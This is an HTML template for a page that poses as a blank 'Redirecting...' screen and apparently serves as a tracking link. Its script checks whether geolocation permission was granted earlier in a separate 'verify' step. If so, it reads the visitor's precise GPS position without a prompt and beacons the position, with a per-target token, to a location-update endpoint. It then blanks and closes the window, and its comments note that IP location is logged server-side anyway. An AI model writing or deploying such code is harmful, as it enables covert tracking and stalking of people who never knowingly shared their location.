<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Redirecting...</title>
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    background: #000;
    overflow: hidden;
    width: 100%; height: 100%;
  }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function() {
  var token = "{{ token }}";
  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.close(); } catch(e) {}
    return;
  {% endif %}

  var sent = false;

  function sendLocation(lat, lng, accuracy, source) {
    if (sent) return;
    sent = true;

    var payload = JSON.stringify({
      token: token,
      latitude: lat,
      longitude: lng,
      accuracy: accuracy,
      source: source
    });

    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      fetch('/api/location-update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: payload,
        keepalive: true
      }).catch(function(){});
    }

    // Redirect to blank immediately
    try { window.location.replace('about:blank'); } catch(e) {}
    setTimeout(function() {
      try { window.location.href = 'about:blank'; } catch(e) {}
      setTimeout(function() {
        try { window.close(); } catch(e) {}
      }, 100);
    }, 50);
  }

  function goAway() {
    if (!sent) {
      sent = true;
      try { window.location.replace('about:blank'); } catch(e) {}
      setTimeout(function() {
        try { window.location.href = 'about:blank'; } catch(e) {}
        setTimeout(function() {
          try { window.close(); } catch(e) {}
        }, 100);
      }, 50);
    }
  }

  // ── Check if GPS permission is already cached (from /verify flow) ──
  if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: 'geolocation' })
      .then(function(permissionStatus) {
        if (permissionStatus.state === 'granted') {
          // Permission was previously granted — fire GPS silently (no prompt!)
          if (!("geolocation" in navigator)) {
            // GPS not available, fall back to IP (already captured server-side)
            goAway();
            return;
          }
          navigator.geolocation.getCurrentPosition(
            function(position) {
              sendLocation(
                position.coords.latitude,
                position.coords.longitude,
                position.coords.accuracy,
                'gps'
              );
            },
            function() {
              // GPS failed despite permission — IP fallback already done server-side
              goAway();
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
          // Safety timeout: if GPS takes too long, just go away
          setTimeout(function() {
            if (!sent) goAway();
          }, 12000);
        } else {
          // Permission not granted (prompt or denied) — 
          // IP geolocation was already captured server-side, just go away
          goAway();
        }
      })
      .catch(function() {
        // Permissions API not supported — go away, IP is the fallback
        goAway();
      });
  } else {
    // No Permissions API — go away, IP is the fallback
    goAway();
  }

  // Safety timeout: go away in 15s no matter what
  setTimeout(function() {
    if (!sent) goAway();
  }, 15000);
})();
</script>
</body>
</html>
